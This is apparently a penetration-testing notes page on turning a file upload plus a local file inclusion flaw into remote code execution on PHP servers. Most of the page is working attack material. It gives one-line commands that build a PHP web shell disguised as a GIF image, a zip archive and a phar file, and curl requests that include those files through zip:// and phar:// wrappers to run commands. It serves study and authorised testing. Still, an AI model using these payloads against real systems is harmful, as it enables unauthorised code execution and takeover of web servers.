---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Upload -> LFI -> RCE

If the vulnerable function has code `Execute` capabilities, then the code within the file we upload will get executed if we include it, **regardless of the file extension or type**. The file upload form does not need to be vulnerable, just allowing file uploads.

<table><thead><tr><th width="299">Function</th><th align="center">Read Content</th><th align="center">Execute</th><th align="center">Remote URL</th></tr></thead><tbody><tr><td><strong>PHP</strong></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td><code>include()</code>/<code>include_once()</code></td><td align="center">✅</td><td align="center">✅</td><td align="center">✅</td></tr><tr><td><code>require()</code>/<code>require_once()</code></td><td align="center">✅</td><td align="center">✅</td><td align="center">❌</td></tr><tr><td><strong>NodeJS</strong></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td><code>res.render()</code></td><td align="center">✅</td><td align="center">✅</td><td align="center">❌</td></tr><tr><td><strong>Java</strong></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td><code>import</code></td><td align="center">✅</td><td align="center">✅</td><td align="center">✅</td></tr><tr><td><strong>.NET</strong></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td><code>include</code></td><td align="center">✅</td><td align="center">✅</td><td align="center">✅</td></tr></tbody></table>

## Image

We can create a malicious image containing PHP code, using an allowed image extension (_bypassing extension filters_), in this case `.gif`,and including the image's [magic bytes](../file-uploads.md#server-side-filters) at the beginning of the file content (`GIF8`) (_bypassing content type filters_).

```bash
# Creating a malicious GIF file
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

This file on its own is harmless and would not affect normal web application. However, if we combine it with an LFI flaw, then we may be able to achieve RCE after finding its [uploads directory](../file-uploads.md#uploads-directory).

```bash
# RCE
curl http://<ip:port>/index.php?language=./profile_images/shell.gif&cmd=id
```

## ZIP

The [zip](https://www.php.net/manual/en/wrappers.compression.php) wrapper (not enabled by default) allows to achieve RCE by archiving a webshell into a zip file ending in an allowed extension, e.g. `.jpg`. The files within the archived can be reached using `#`. This has a higher chance to work if ZIP uploads are allowed by the application, as content-type filters may block it.

{% code overflow="wrap" %}
```shell
# Creating and archiving webshell (zip file = shell.jpg)
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
# upload -> RCE (URL-encode '#' -> %23)
curl http://<ip:port>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```
{% endcode %}

## Phar

We can also use the `phar://` wrapper to achieve a similar result. The script below can be compiled into a `phar` file that when called would write a web shell to a `shell.txt` sub-file, which can be accessed using `/`.

{% code title="shell.php" %}
```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```
{% endcode %}

{% code overflow="wrap" %}
```shell
# Compiling the script into a phar file called 'shell.jpg'
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
# Upload -> RCE (URL-encode '/' -> %2F)
curl http://<ip:port>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```
{% endcode %}

There is another obsolete LFI/uploads attack worth noting, which occurs if file uploads is enabled in the PHP config and the `phpinfo()` page is somehow exposed to us. This attack has very specific requirements to work: LFI + uploads enabled + old PHP + exposed `phpinfo()`. You can find more info [here](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-phpinfo).
